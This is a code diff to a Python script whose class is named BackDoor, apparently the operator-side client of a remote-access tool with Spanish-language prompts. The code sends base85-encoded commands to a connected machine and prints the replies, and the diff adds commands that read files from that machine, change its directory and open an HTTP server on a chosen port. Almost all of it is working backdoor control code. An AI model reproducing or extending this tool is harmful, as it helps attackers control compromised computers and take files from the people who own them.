@@ -10,6 +10,8 @@ import sys
 
 from http.server import BaseHTTPRequestHandler, HTTPServer
 
+from os import read
+
 global _CodingBase85Text
 global _DecodingBase85Text
 global i
@@ -19,17 +21,16 @@ def _MAIN():
     i = 1
 
     def _CodingBase85Text(ServerConnect, text):
-        data = base64.b85encode(text.encode(), pad=False)
+        data = base64.b85encode(text.encode('ascii'), pad=False)
         ServerConnect.send(data)
 
     def _DecodingBase85Text(ServerConnect, buff):
         try:
             data = ServerConnect.recv(int(buff)).decode()
             data = base64.b85decode(data)
-            return str(data.decode())
-        except ValueError:
-            #print('\033[1;36mocurrio un error desconocido')
-            pass
+            return str(data.decode('ascii'))
+        except (ValueError, KeyboardInterrupt):
+            print("\033[1;36merror de valores o de Keyboard")
             #i = 2
 
     class BackDoor:
@@ -37,7 +38,13 @@ def _MAIN():
         def __init__(self):
 
             self.Host = '127.0.0.1'
-            self.Port = 6365
+
+            try:
+                self.Port = sys.argv[1]
+                self.Port = int(self.Port)
+            except IndexError:
+                self.Port = 6365
+
             self.Green = "\033[1;32m"
             self.White = "\033[1;37m"
             self.Data = None
@@ -49,7 +56,8 @@ def _MAIN():
             self.Cwd = str(os.getcwd())
 
         def Connection(self):
-            self.Client.connect((self.Host, self.Port))
+            print("intentando conectarse a " + str(self.Host)+":"+str(self.Port))
+            self.Client.connect((str(self.Host), int(self.Port)))
             print(_DecodingBase85Text(self.Client, 8000))
 
             while int(i) == 1:
@@ -62,7 +70,7 @@ def _MAIN():
                         _CodingBase85Text(self.Client, str('exit'))
                         self.Client.close()
                         break
-                    
+
                     elif str(command) == '' or str(command) == ' ' or str(command) == '\n':
                         print("comando incorrecto")
 
@@ -71,13 +79,8 @@ def _MAIN():
                         dat = str(input("ruta a la que acede: "))
                         _CodingBase85Text(self.Client, str(dat))
                         buff = _DecodingBase85Text(self.Client, 8000)
-                        if buff == None:
-                            buff = 800
-                        else:
-                            pass
-                        dat = _DecodingBase85Text(self.Client, int(buff)*8)
-                        print(str("ruta: " +str(dat)+" se a podido aceder correctamente."))
-                        self.Cwd = str(dat)
+                        print(buff)
+                        #ruta
 
                     elif str(command) == 'OsInfo':
                         _CodingBase85Text(self.Client, str('OsInfo'))
@@ -90,8 +93,9 @@ def _MAIN():
 
                     elif str(command) == 'HttpServer':
                         _CodingBase85Text(self.Client, str('HttpServer'))
-                        data = _DecodingBase85Text(self.Client, 8000)
-                        print(str(data))
+                        PortHttp = int(input("introduce el puerto que abrir: "))
+                        _CodingBase85Text(self.Client, str(PortHttp))
+                        print(_DecodingBase85Text(self.Client, 8000))
 
                     elif str(command) == 'CloseHttpServer':
                         _CodingBase85Text(self.Client, str('CloseHttpServer'))
@@ -99,7 +103,27 @@ def _MAIN():
                         print(str(data))
 
                     elif str(command) == 'cd ..':
-                        print("el comando: cd .. y sus derrivantes no estan disponibles")
+                        _CodingBase85Text(self.Client, str('cd ..'))
+                        print("se consigio cambiar al repositorio anterior.")
+                        self.Cwd = _DecodingBase85Text(self.Client, 2048)
+
+                    elif str(command) == 'clear':
+                        if sys.platform == 'linux' or sys.platform == 'linux2':
+                            os.system("clear")
+                        elif sys.platform == 'win32':
+                            os.system("cls")
+                        else :
+                            os.system("cls")
+                    elif str(command) == 'read':
+                        _CodingBase85Text(self.Client, str('read'))
+                        _CodingBase85Text(self.Client, str(input("nombre del archivo a leer: ")))
+                        _type = str(_DecodingBase85Text(self.Client, 8000))
+                        if _type == 'binary':
+                            a = self.Client.recv(self.buffer).decode('utf-16')
+                            a = base64.b85decode(str(a))
+                            print(a)
+                        elif _type == 'no binary':
+                            print(str(_DecodingBase85Text(self.Client, self.buffer)))
 
                     else:
 
@@ -108,8 +132,7 @@ def _MAIN():
                         if self.buffer == None or self.buffer == 0:
                             self.buffer = 2048
                         else:
-                            opert = _DecodingBase85Text(
-                                self.Client, self.buffer)
+                            opert = _DecodingBase85Text(self.Client, self.buffer)
 
                             if opert == None:
                                 self.buffer = 3000
@@ -130,7 +153,7 @@ def _MAIN():
                             print(str(data))
                             data = None  # restablecemos la variable data
                             self.buffer = 3000 * 8 + 50
-                    
+
                         if sys.platform == 'linux' or sys.platform == 'linux2':
                             subprocess.getstatusoutput("clear")
                         elif sys.platform == 'win32':
